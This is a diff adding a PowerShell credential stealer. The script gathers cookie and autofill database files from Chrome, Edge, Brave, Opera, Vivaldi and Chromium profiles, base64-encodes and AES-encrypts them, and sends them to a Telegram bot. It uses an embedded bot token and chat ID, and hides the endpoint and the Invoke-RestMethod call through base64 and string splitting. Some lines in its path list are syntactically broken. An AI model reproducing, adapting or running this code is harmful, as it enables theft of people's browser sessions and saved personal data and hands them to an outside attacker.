@@ -1,0 +1,77 @@
+ 
+$A1 = "8065834690:AAE8me5r1T3TxRzPs-ucwHbjzHJzDuTQ8V0"
+$B2 = "431663060"
+
+Function Zz {
+    param ([string]$D1, [string]$K1 = "MySuperSecretKey123")
+    $C1 = New-Object System.Security.Cryptography.AesManaged
+    $C1.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $C1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $C1.Key = [System.Text.Encoding]::UTF8.GetBytes($K1)
+    $C1.GenerateIV()
+    $E1 = $C1.CreateEncryptor()
+    $B1 = [System.Text.Encoding]::UTF8.GetBytes($D1)
+    $F1 = $E1.TransformFinalBlock($B1, 0, $B1.Length)
+    $M1 = New-Object System.IO.MemoryStream
+    $M1.Write($C1.IV, 0, $C1.IV.Length)
+    $M1.Write($F1, 0, $F1.Length)
+    $R1 = $M1.ToArray()
+    [Convert]::ToBase64String($R1)
+}
+
+Function Xx {
+    $P1 = @(
+        \"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
+        \"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
+        \"$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
+        \"$env:APPDATA\Opera Software\Opera GX Stable\Cookies",
+        \$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies,
+        \$env:LOCALAPPDATA\Chromium\User Data\Default\Cookies
+        
+# Auto Fills
+
+        \$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data,
+        \$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data,
+        \$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data,
+        \$env:APPDATA\Opera Software\Opera GX Stable\Web Data,
+        \$env:APPDATA\Opera Software\Opera Stable\Web Data,
+      	\$env:LOCALAPPDATA\Chromium\User Data\Default\Web Data
+        \$env:LOCALAPPDATA\Vivaldi\User Data\Default\Web Data    
+        \$env:LOCALAPPDATA\Chromium\User Data\Default\Web Data
+  
+    )
+    $Zz = ""
+
+    foreach ($Q1 in $P1) {
+        if (Test-Path $Q1) {
+            try {
+                $Zz += ('='*3) + $Q1 + "`n"
+                $D2 = [System.IO.File]::ReadAllBytes($Q1)
+                $Zz += [Convert]::ToBase64String($D2) + "`n"
+            } catch {
+                $Zz += ("err@:" + $Q1 + "`n")
+            }
+        }
+    }
+    return $Zz
+}
+
+Function Yy {
+    param ([string]$Msg)
+    $b64 = 'aHR0cHM6Ly9hcGku' + 'dGVsZWdyYW0ub3Jn' + '/Ym90'
+    $uri = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)) + $A1 + "/sendMessage"
+
+    $body = @{ 
+        ('c'+'hat_id') = $B2
+        ('te'+'xt') = $Msg
+        ('pars'+'e_mode') = "Markdown"
+    }
+
+    $IR = ('In'+'voke') + '-RestMethod'
+    &($IR) -Uri $uri -Method Post -Body $body
+}
+
+# Entry Point
+$DUMP = Xx
+$ENC = Zz -D1 $DUMP
+Yy -Msg ('Result:`n`n' + $ENC)
